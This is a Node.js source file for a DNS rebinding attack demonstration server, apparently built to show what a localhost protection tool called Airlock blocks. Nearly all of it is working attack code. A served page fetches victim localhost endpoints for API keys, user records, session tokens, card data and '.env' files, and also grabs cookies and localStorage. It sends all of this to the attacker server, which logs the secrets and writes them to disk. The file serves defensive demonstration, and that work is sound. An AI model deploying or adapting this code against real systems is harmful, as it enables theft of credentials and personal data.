/**
 * DNS Rebinding Attack Demonstration Server
 *
 * WARNING: This is for EDUCATIONAL PURPOSES ONLY
 * This server demonstrates DNS rebinding attacks that Airlock protects against.
 *
 * What This Attacker Steals:
 * - API Keys (OpenAI, Stripe, AWS)
 * - User Database (emails, SSNs, password hashes)
 * - Session Tokens (JWT tokens, session IDs)
 * - Credit Card Information
 * - Database Credentials
 * - Files from filesystem (.env, SSH keys, etc.)
 * - Network request/response data
 */

import http from 'http';
import { URL } from 'url';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Configuration
const ATTACKER_PORT = 8888;
const VICTIM_LOCALHOST_PORT = 3000; // The port Airlock (or victim) runs on

// Stolen data storage with enhanced tracking
let stolenData = {
  apiKeys: [],
  users: [],
  sessions: [],
  creditCards: [],
  configs: [],
  files: [], // NEW: Stolen files
  networkCaptures: [], // NEW: Captured network traffic
  totalBytes: 0,
  attacksSuccessful: 0,
  attacksFailed: 0,
  filesStolen: 0,
  capturedRequests: 0
};

// Colors for terminal output
const colors = {
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  reset: '\x1b[0m',
  bold: '\x1b[1m',
};

function log(type, message) {
  const timestamp = new Date().toISOString();
  const prefix = {
    'attack': `${colors.red}${colors.bold}[ATTACK]${colors.reset}`,
    'success': `${colors.green}[SUCCESS]${colors.reset}`,
    'info': `${colors.blue}[INFO]${colors.reset}`,
    'warn': `${colors.yellow}[WARN]${colors.reset}`,
    'exfil': `${colors.magenta}${colors.bold}[DATA STOLEN]${colors.reset}`,
    'blocked': `${colors.red}[BLOCKED]${colors.reset}`,
  };
  console.log(`${prefix[type]} ${timestamp} - ${message}`);
}

/**
 * Malicious HTML page that performs DNS rebinding attack
 */
function getAttackPage() {
  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Attacker Dashboard</title>
  <style>
    body {
      font-family: 'Courier New', Courier, monospace;
      max-width: 1000px;
      margin: 0 auto;
      padding: 20px;
      background: #000000;
      color: #00ff00;
    }
    .container {
      background: #000000;
      padding: 30px;
      border: 1px solid #333333;
      border-radius: 0;
    }
    h1 { margin-top: 0; font-size: 2.5em; color: #ff3333; border-bottom: 1px solid #333333; padding-bottom: 10px; }
    .prize { font-size: 1.2em; color: #ffcc00; text-align: center; margin: 20px 0; }
    .status {
      background: #0a0a0a;
      padding: 15px;
      border: 1px solid #333333;
      margin: 20px 0;
      font-family: 'Courier New', monospace;
      font-size: 14px;
      color: #d4d4d4;
    }
    .status-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin-top: 10px;
    }
    .attack-log {
      background: #0a0a0a;
      padding: 15px;
      border: 1px solid #333333;
      max-height: 400px;
      overflow-y: auto;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      color: #cccccc;
    }
    .warning {
      background: #222200;
      border-left: 2px solid #d7ba7d;
      color: #d7ba7d;
      padding: 15px;
      margin: 20px 0;
    }
    button {
      background: #110000;
      color: #ff3333;
      border: 1px solid #ff3333;
      padding: 12px 24px;
      border-radius: 0;
      cursor: pointer;
      font-size: 14px;
      margin: 10px 5px;
      font-weight: bold;
      font-family: 'Courier New', monospace;
    }
    button:hover { background: #330000; }
    button:disabled { background: #111111; color: #555555; border-color: #555555; cursor: not-allowed; }
    .success { color: #00ff00; font-weight: bold; }
    .error { color: #ff3333; font-weight: bold; }
    .stolen-data {
      background: #0a0a0a;
      padding: 15px;
      border: 1px solid #333333;
      margin-top: 20px;
      max-height: 300px;
      overflow-y: auto;
    }
    .data-item {
      background: #000000;
      padding: 10px;
      margin: 5px 0;
      border-left: 2px solid #ffcc00;
      color: #d4d4d4;
    }
    .spinner {
      display: inline-block;
      width: 12px;
      height: 12px;
      border: 2px solid rgba(255,255,255,0.3);
      border-top-color: #00ff00;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .dim { color: #666666; }
  </style>
</head>
<body>
  <div class="container">
    <h1>[ MALICIOUS ATTACK DASHBOARD ]</h1>
    <p class="dim">> Initiating DNS rebinding attack vectors against localhost.</p>

    <div class="warning">
      <strong>[WARNING] DEMO ONLY:</strong> This page demonstrates a DNS rebinding attack.
      In a REAL attack, victims would NOT see this dashboard.
    </div>

    <div class="status">
      <strong style="color: #ffffff;">[ SYSTEM STATUS ]</strong>
      <div class="status-grid">
        <div>Status: <span id="status" style="color: #00ff00;">Ready</span></div>
        <div>Attacks: <span id="attempts">0</span></div>
        <div>Successful: <span id="success">0</span></div>
        <div>Blocked: <span id="blocked">0</span></div>
      </div>
      <div style="margin-top: 10px; border-top: 1px solid #333; padding-top: 10px;">
        <div>Data Stolen: <span id="stolen" style="color: #ffcc00;">0 bytes</span></div>
        <div>Target: <span id="target" style="color: #569cd6;">localhost:${VICTIM_LOCALHOST_PORT}</span></div>
      </div>
    </div>

    <div>
      <button id="startBtn" onclick="startAttack()">[ START ATTACK ]</button>
      <button id="stopBtn" onclick="stopAttack()" disabled>[ STOP ATTACK ]</button>
      <button onclick="clearLog()">[ CLEAR LOG ]</button>
      <button onclick="viewStolen()">[ VIEW STOLEN DATA ]</button>
    </div>

    <h3 style="color: #ffffff;">> Attack Targets:</h3>
    <div style="background: #0a0a0a; padding: 15px; border: 1px solid #333333; font-size: 14px; color: #d4d4d4;">
      <div style="color: #ffaa00;"><strong>[API Endpoints]</strong></div>
      <div>- API Keys (OpenAI, Stripe, AWS)</div>
      <div>- User Database (emails, SSNs, passwords)</div>
      <div>- Session Tokens (JWT, auth tokens)</div>
      <div>- Credit Card Numbers (CVV, expiry)</div>
      <div>- Database Credentials</div>
      <div style="margin-top: 10px; color: #ffaa00;"><strong>[File System Access]</strong></div>
      <div>- .env Files (secrets, API keys)</div>
      <div>- Configuration Files (package.json)</div>
      <div style="margin-top: 10px; color: #ffaa00;"><strong>[Network Surveillance]</strong></div>
      <div>- HTTP Request/Response Capture</div>
      <div>- WebSocket Message Interception</div>
    </div>

    <h3 style="color: #ffffff;">> Attack Log:</h3>
    <div class="attack-log" id="log"></div>

    <div class="stolen-data" id="stolenData" style="display: none;">
      <h3 style="color: #ff3333;">> Exfiltrated Data:</h3>
      <div id="stolenContent"></div>
    </div>
  </div>

  <script>
    let attackInterval = null;
    let attemptCount = 0;
    let successCount = 0;
    let blockedCount = 0;
    let totalStolen = 0;
    let stolenItems = [];

    const endpoints = [
      { path: '/api/secrets', name: 'API Keys', icon: '[KEY]' },
      { path: '/api/users', name: 'User Database', icon: '[USR]' },
      { path: '/api/session', name: 'Session Tokens', icon: '[TKN]' },
      { path: '/api/payment', name: 'Credit Cards', icon: '[CRD]' },
      { path: '/api/config', name: 'Configuration', icon: '[CFG]' }
    ];

    const fileTargets = [
      { path: '/.env', name: 'Environment File', icon: '[FIL]' },
      { path: '/../.env', name: 'Parent .env', icon: '[FIL]' },
      { path: '/package.json', name: 'Package Config', icon: '[FIL]' }
    ];

    function addLog(message, isSuccess = false, isError = false) {
      const log = document.getElementById('log');
      const timestamp = new Date().toLocaleTimeString();
      const className = isSuccess ? 'success' : (isError ? 'error' : 'dim');
      log.innerHTML += \`<div class="\${className}">[\${timestamp}] \${message}</div>\`;
      log.scrollTop = log.scrollHeight;
    }

    function updateStatus(status) {
      document.getElementById('status').innerHTML = status;
      document.getElementById('attempts').textContent = attemptCount;
      document.getElementById('success').textContent = successCount;
      document.getElementById('blocked').textContent = blockedCount;
      document.getElementById('stolen').textContent = totalStolen + ' bytes';
    }

    async function attemptExfiltration() {
      attemptCount++;

      // Phase 1: Steal API data
      for (const endpoint of endpoints) {
        try {
          const targetUrl = \`http://\${window.location.hostname}:${VICTIM_LOCALHOST_PORT}\${endpoint.path}\`;
          addLog(\`\${endpoint.icon} Attempting to steal \${endpoint.name}...\`);

          const response = await fetch(targetUrl, {
            method: 'GET',
            credentials: 'include',
            mode: 'cors',
          });

          if (!response.ok) {
            throw new Error('Request failed');
          }

          const data = await response.json();
          const dataSize = JSON.stringify(data).length;
          totalStolen += dataSize;
          successCount++;

          stolenItems.push({
            type: 'api',
            endpoint: endpoint.name,
            icon: endpoint.icon,
            data: data,
            size: dataSize,
            time: new Date().toISOString()
          });

          addLog(\`[SUCCESS] Stolen \${endpoint.name} (\${dataSize} bytes)\`, true);

          await fetch('/exfiltrate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'api',
              endpoint: endpoint.path,
              name: endpoint.name,
              data: data,
              size: dataSize,
              userAgent: navigator.userAgent,
              cookies: document.cookie,
              localStorage: Object.keys(localStorage).length > 0 ? JSON.stringify(localStorage) : null
            })
          }).catch(() => {});

        } catch (error) {
          blockedCount++;
          if (attemptCount === 1) {
            addLog(\`[...] \${endpoint.icon} \${endpoint.name} - Waiting for DNS rebind...\`);
          } else {
            addLog(\`[BLOCKED] \${endpoint.icon} \${endpoint.name} - Connection refused by Airlock\`, false, true);
          }
        }
      }

      // Phase 2: Attempt to steal files
      for (const fileTarget of fileTargets) {
        try {
          const targetUrl = \`http://\${window.location.hostname}:${VICTIM_LOCALHOST_PORT}/api/read-file?path=\${encodeURIComponent(fileTarget.path)}\`;
          addLog(\`\${fileTarget.icon} Attempting to steal \${fileTarget.name}...\`);

          const response = await fetch(targetUrl, {
            method: 'GET',
            credentials: 'include',
            mode: 'cors',
          });

          if (!response.ok) {
            throw new Error('File read failed');
          }

          const fileData = await response.text();
          const fileSize = fileData.length;
          totalStolen += fileSize;
          successCount++;

          stolenItems.push({
            type: 'file',
            endpoint: fileTarget.name,
            icon: fileTarget.icon,
            data: fileData,
            size: fileSize,
            path: fileTarget.path,
            time: new Date().toISOString()
          });

          addLog(\`[SUCCESS] Stolen file \${fileTarget.name} (\${fileSize} bytes)\`, true);

          await fetch('/exfiltrate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'file',
              name: fileTarget.name,
              path: fileTarget.path,
              data: fileData,
              size: fileSize
            })
          }).catch(() => {});

        } catch (error) {
          blockedCount++;
          if (attemptCount <= 1) {
            addLog(\`[...] \${fileTarget.icon} \${fileTarget.name} - Waiting...\`);
          } else {
            addLog(\`[BLOCKED] \${fileTarget.icon} \${fileTarget.name} - Connection refused by Airlock\`, false, true);
          }
        }
      }

      // Phase 3: Attempt to capture network traffic
      try {
        const targetUrl = \`http://\${window.location.hostname}:${VICTIM_LOCALHOST_PORT}/api/network-capture\`;
        addLog('[NET] Attempting to capture network traffic...');

        const response = await fetch(targetUrl, {
          method: 'GET',
          credentials: 'include',
          mode: 'cors',
        });

        if (response.ok) {
          const capturedData = await response.json();
          const captureSize = JSON.stringify(capturedData).length;
          totalStolen += captureSize;
          successCount++;

          stolenItems.push({
            type: 'network',
            endpoint: 'Network Traffic',
            icon: '[NET]',
            data: capturedData,
            size: captureSize,
            time: new Date().toISOString()
          });

          addLog(\`[SUCCESS] Captured network traffic (\${captureSize} bytes)\`, true);

          await fetch('/exfiltrate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'network',
              name: 'Network Capture',
              data: capturedData,
              size: captureSize
            })
          }).catch(() => {});
        }
      } catch (error) {
        blockedCount++;
        if (attemptCount <= 1) {
          addLog('[...] [NET] Network capture - Waiting...');
        } else {
          addLog('[BLOCKED] [NET] Network capture - Connection refused', false, true);
        }
      }

      if (successCount > 0) {
        updateStatus('<span class="success">ATTACK SUCCESS</span>');
        addLog('---------------------------------------', true);
        addLog(\`[EXFIL] TOTAL STOLEN: \${successCount} items, \${totalStolen} bytes\`, true);
        addLog('---------------------------------------', true);
        stopAttack();
      } else {
        updateStatus('<span class="spinner"></span> Attacking...');
      }
    }

    function startAttack() {
      if (attackInterval) return;
      document.getElementById('startBtn').disabled = true;
      document.getElementById('stopBtn').disabled = false;

      addLog('---------------------------------------');
      addLog('> Starting DNS Rebinding Attack...');
      addLog('> Phase 1: Page loaded from attacker');
      addLog('> Phase 2: DNS rebinds to 127.0.0.1');
      addLog('> Phase 3: Exfiltrating sensitive data...');
      addLog('---------------------------------------');

      updateStatus('<span class="spinner"></span> In Progress');
      attackInterval = setInterval(attemptExfiltration, 3000);
      attemptExfiltration();
    }

    function stopAttack() {
      if (attackInterval) {
        clearInterval(attackInterval);
        attackInterval = null;
      }
      document.getElementById('startBtn').disabled = false;
      document.getElementById('stopBtn').disabled = true;

      if (successCount === 0 && attemptCount > 2) {
        addLog('[SECURE] All attacks BLOCKED - Protected by Airlock', false, true);
        updateStatus('<span style="color:#ff3333">BLOCKED</span>');
      }
    }

    function clearLog() {
      document.getElementById('log').innerHTML = '';
      attemptCount = 0;
      successCount = 0;
      blockedCount = 0;
      totalStolen = 0;
      stolenItems = [];
      updateStatus('Ready');
    }

    function viewStolen() {
      const stolenDiv = document.getElementById('stolenData');
      const stolenContent = document.getElementById('stolenContent');

      if (stolenItems.length === 0) {
        alert('No data stolen yet. Start attack first.');
        return;
      }

      stolenContent.innerHTML = '';
      stolenItems.forEach(item => {
        const div = document.createElement('div');
        div.className = 'data-item';

        let content = '';
        if (item.type === 'file') {
          content = \`<pre style="margin: 10px 0; font-size: 11px; max-height: 150px; overflow-y: auto; background: #000; color: #d4d4d4; padding: 10px; border: 1px solid #333;">\${item.data}</pre>\`;
        } else {
          content = \`<pre style="margin: 10px 0; font-size: 11px; max-height: 150px; overflow-y: auto; background: #000; color: #569cd6; border: 1px solid #333;">\${JSON.stringify(item.data, null, 2)}</pre>\`;
        }

        div.innerHTML = \`
          <strong style="color: #ffcc00;">\${item.icon} \${item.endpoint}</strong> (\${item.size} bytes)
          \${item.type ? \`<span style="background: #330000; color: #ff3333; padding: 2px 8px; font-size: 10px; margin-left: 8px;">\${item.type.toUpperCase()}</span>\` : ''}
          \${content}
          <small class="dim">\${new Date(item.time).toLocaleString()}</small>
        \`;
        stolenContent.appendChild(div);
      });

      stolenDiv.style.display = stolenDiv.style.display === 'none' ? 'block' : 'none';
    }

    setTimeout(() => {
      addLog('> This demonstrates DNS rebinding attacks');
      addLog('> Click "[ START ATTACK ]" to begin');
    }, 500);
  </script>
</body>
</html>
  `;
}

/**
 * Main attack server
 */
const server = http.createServer((req, res) => {
  const urlParsed = new URL(req.url, `http://${req.headers.host}`);
  const pathname = urlParsed.pathname;

  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Credentials': 'true',
  };

  if (req.method === 'OPTIONS') {
    res.writeHead(200, corsHeaders);
    res.end();
    return;
  }

  if (pathname === '/' || pathname === '/attack') {
    log('attack', `Serving malicious page to ${req.socket.remoteAddress}`);
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', ...corsHeaders });
    res.end(getAttackPage());
    return;
  }

  if (pathname === '/exfiltrate' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        stolenData.totalBytes += data.size;
        stolenData.attacksSuccessful++;

        log('exfil', `${colors.bold}STOLEN: ${data.name}${colors.reset}`);
        log('exfil', `  > Type: ${data.type || 'api'}`);
        log('exfil', `  > Size: ${data.size} bytes`);

        // Handle different types of stolen data
        if (data.type === 'file') {
          stolenData.filesStolen++;
          stolenData.files.push({
            name: data.name,
            path: data.path,
            size: data.size,
            content: data.data.substring(0, 200), // Store preview only
            timestamp: new Date().toISOString()
          });
          log('exfil', `  > ${colors.red}FILE STOLEN: ${data.path}${colors.reset}`);
          log('exfil', `  > Preview: ${data.data.substring(0, 100)}...`);

          // Write stolen file to disk
          const stolenFilesDir = path.join(__dirname, 'stolen-files');
          if (!fs.existsSync(stolenFilesDir)) {
            fs.mkdirSync(stolenFilesDir, { recursive: true });
          }
          const safeFileName = data.name.replace(/[^a-z0-9]/gi, '_').toLowerCase();
          fs.writeFileSync(
            path.join(stolenFilesDir, `${Date.now()}_${safeFileName}.txt`),
            `# Stolen from: ${data.path}\n# Time: ${new Date().toISOString()}\n# Size: ${data.size} bytes\n\n${data.data}`
          );

        } else if (data.type === 'network') {
          stolenData.capturedRequests++;
          stolenData.networkCaptures.push({
            name: data.name,
            size: data.size,
            requests: data.data,
            timestamp: new Date().toISOString()
          });
          log('exfil', `  > ${colors.red}NETWORK TRAFFIC CAPTURED${colors.reset}`);

        } else {
          // API data exfiltration
          if (data.name === 'API Keys' && data.data.secrets) {
            log('exfil', `  > OpenAI: ${data.data.secrets.openai}`);
            log('exfil', `  > AWS: ${data.data.secrets.aws}`);
            stolenData.apiKeys.push(data.data.secrets);
          } else if (data.name === 'User Database' && data.data.users) {
            log('exfil', `  > ${data.data.users.length} users stolen`);
            data.data.users.forEach(user => {
              log('exfil', `    - ${user.email} (SSN: ${user.ssn})`);
            });
            stolenData.users.push(...data.data.users);
          } else if (data.name === 'Credit Cards' && data.data.creditCards) {
            log('exfil', `  > ${data.data.creditCards.length} cards stolen`);
            stolenData.creditCards.push(...data.data.creditCards);
          }
        }

        log('success', `${colors.green}${colors.bold}SUCCESS!${colors.reset} Total: ${stolenData.totalBytes} bytes`);

        // Save all stolen data
        fs.writeFileSync(
          path.join(__dirname, 'stolen-data.json'),
          JSON.stringify(stolenData, null, 2)
        );
      } catch (e) {
        log('warn', 'Invalid exfiltration data: ' + e.message);
      }
    });
    res.writeHead(200, corsHeaders);
    res.end('OK');
    return;
  }

  res.writeHead(404, corsHeaders);
  res.end('Not Found');
});

server.listen(ATTACKER_PORT, '0.0.0.0', () => {
  console.log(`
${colors.red}${colors.bold}╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║       DNS REBINDING ATTACK DEMONSTRATION SERVER           ║
║                                                           ║
║  [WARNING] FOR EDUCATIONAL PURPOSES ONLY                  ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝${colors.reset}

${colors.yellow}> Attacker Server:${colors.reset} http://127.0.0.1:${ATTACKER_PORT}/attack
${colors.cyan}> Target:${colors.reset} localhost:${VICTIM_LOCALHOST_PORT}

${colors.green}Usage:${colors.reset}
  1. WITHOUT Airlock (Vulnerable): PORT=3000 node test-server.js
  2. Visit: http://127.0.0.1:${ATTACKER_PORT}/attack
  3. Click "[ START ATTACK ]" -> Data stolen!

  4. WITH Airlock (Protected): ./start.sh
  5. Visit: http://127.0.0.1:${ATTACKER_PORT}/attack
  6. Click "[ START ATTACK ]" -> Blocked!

${colors.magenta}Waiting for victims...${colors.reset}
`);
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`${colors.red}Error: Port ${ATTACKER_PORT} already in use${colors.reset}`);
    console.error(`Run: kill $(lsof -t -i:${ATTACKER_PORT})`);
  } else {
    console.error(`${colors.red}Server error:${colors.reset}`, err);
  }
  process.exit(1);
});

process.on('SIGINT', () => {
  console.log(`\n${colors.yellow}Shutting down...${colors.reset}`);
  if (stolenData.attacksSuccessful > 0) {
    console.log(`\n${colors.red}Final Stats:${colors.reset}`);
    console.log(`  Attacks: ${stolenData.attacksSuccessful}`);
    console.log(`  Data: ${stolenData.totalBytes} bytes`);
    console.log(`  Users: ${stolenData.users.length}`);
  }
  server.close();
  process.exit(0);
});
